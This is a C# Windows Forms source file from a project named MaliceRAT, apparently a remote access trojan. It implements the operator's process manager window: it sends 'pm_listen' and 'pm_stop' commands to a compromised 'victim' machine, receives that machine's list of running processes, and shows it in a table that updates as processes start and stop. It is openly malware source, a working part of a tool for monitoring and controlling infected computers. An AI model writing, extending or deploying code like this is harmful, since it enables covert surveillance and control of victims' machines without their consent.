using System.Windows.Forms;
using System.Collections.Generic;
using MaliceRAT.RatServer;
using MaliceRAT.RatServer.Features;

namespace MaliceRAT.RatUI
{
    public partial class ProcessManagerForm : Form
    {
        #region Variables
        private readonly Server server;
        private readonly int victimId;
        #endregion

        #region Constructor
        public ProcessManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.server = server;
            this.victimId = victimId;

            server.processManager.OnProcessListReceived += OnProcessListReceived;
            server.processManager.OnProcessStarted += OnProcessStarted;
            server.processManager.OnProcessStopped += OnProcessStopped;

            titleLabel.Text = $"Process Manager [{server.GetVictimById(victimId).User}]";
        }
        #endregion

        #region Event Handlers
        private void OnProcessListReceived(Victim victim, List<ProcessManager.ProcessInfo> data)
        {
            gunaProcessTable.Invoke((MethodInvoker)delegate {
                gunaProcessTable.Rows.Clear();
                foreach (var process in data)
                {
                    gunaProcessTable.Rows.Add(process.ProcessName, process.DisplayName, process.Pid);
                }
            });
        }

        private void OnProcessStarted(Victim victim, string displayName, string processName, int pid)
        {
            gunaProcessTable.Invoke((MethodInvoker)delegate { gunaProcessTable.Rows.Add(processName, displayName, pid); });
        }

        private void OnProcessStopped(Victim victim, string displayName, string processName, int pid)
        {
            gunaProcessTable.Invoke((MethodInvoker)delegate {
                foreach (DataGridViewRow row in gunaProcessTable.Rows)
                {
                    if ((string)row.Cells[0].Value == processName && (int)row.Cells[2].Value == pid)
                    {
                        gunaProcessTable.Rows.Remove(row);
                        break;
                    }
                }
            });
        }
        #endregion

        #region Form Events
        private void ProcessManagerForm_Load(object sender, System.EventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "pm_listen" });
        }

        private void ProcessManagerForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            server.GetVictimById(victimId).Send(new { type = "pm_stop" });
        }
        #endregion

        #region Helper Classes
        public class ProcessInfo
        {
            public string ProcessName { get; set; }
            public string DisplayName { get; set; }
            public int Pid { get; set; }
        }
        #endregion
    }
}